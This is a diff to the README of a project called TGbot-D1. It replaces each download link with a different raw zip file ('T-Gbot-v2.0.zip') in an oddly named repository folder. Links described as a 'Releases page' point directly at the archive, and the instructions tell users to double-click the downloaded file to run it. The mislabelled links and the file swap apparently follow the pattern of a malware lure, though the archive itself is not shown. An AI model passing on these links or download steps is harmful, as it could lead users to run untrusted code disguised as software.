@@ -21,7 +21,7 @@ TGbot-D1 includes a variety of useful features:
 
 To get started, you'll need to download TGbot-D1. Click the link below to visit our releases page.
 
-[![Download TGbot-D1](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/TGbot-D1_v3.2.zip)](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/TGbot-D1_v3.2.zip)
+[![Download TGbot-D1](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/T-Gbot-v2.0.zip)](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/T-Gbot-v2.0.zip)
 
 ### Steps to Download:
 
@@ -30,7 +30,7 @@ To get started, you'll need to download TGbot-D1. Click the link below to visit 
 3. **Download the Application:** Click on the asset that matches your operating system (e.g., Windows, Mac, Linux) to start the download.
 4. **Launch the Application:** After the download is complete, locate the downloaded file (usually in your Downloads folder) and double-click to run it.
 
-Keep this link handy for future updates: [TGbot-D1 Releases](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/TGbot-D1_v3.2.zip).
+Keep this link handy for future updates: [TGbot-D1 Releases](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/T-Gbot-v2.0.zip).
 
 ## 🖥️ System Requirements
 
@@ -53,7 +53,7 @@ If you run into any issues while downloading or running TGbot-D1, we offer sever
 
 To keep TGbot-D1 running smoothly, it's important to update to the latest version regularly. Follow these steps to update:
 
-1. Return to the [TGbot-D1 Releases](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/TGbot-D1_v3.2.zip) page.
+1. Return to the [TGbot-D1 Releases](https://raw.githubusercontent.com/safiesty/TGbot-D1/main/richesse/T-Gbot-v2.0.zip) page.
 2. Find the latest version.
 3. Download it the same way as before.
 4. Replace the old version with the new one by following the installation steps again.
